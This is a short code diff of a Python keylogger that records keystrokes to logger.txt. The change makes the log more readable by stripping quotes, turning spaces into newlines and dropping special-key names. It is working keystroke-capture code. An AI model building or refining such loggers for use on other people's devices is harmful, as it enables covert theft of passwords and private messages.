@@ -8,7 +8,11 @@ keys = []
 def write_file(keys):
     with open ('logger.txt', 'a') as f:
         for key in keys:
-            f.write(str(key))
+            k = str(key).replace("'", "")
+            if k.find("space") > 0:
+                f.write('\n')
+            elif k.find("Key") == -1:
+                f.write(k)
 
 def on_press(key):
     global keys, count
@@ -22,7 +26,7 @@ def on_press(key):
       write_file(keys)
       keys = []
 
-def on_release(key):
+def on_release(key): 
   if key == Key.esc:
     return False
 
